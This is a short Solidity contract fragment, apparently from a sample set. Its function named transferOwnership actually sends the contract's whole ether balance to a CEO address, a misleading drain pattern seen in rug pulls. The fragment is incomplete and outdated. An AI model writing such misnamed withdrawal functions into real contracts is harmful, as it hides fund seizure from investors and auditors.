contract CraigGrantShrimper {
function transferOwnership() onlyCEO public {
		uint256 etherBalance = this.balance;
		ceoAddress.transfer(etherBalance);
	}
}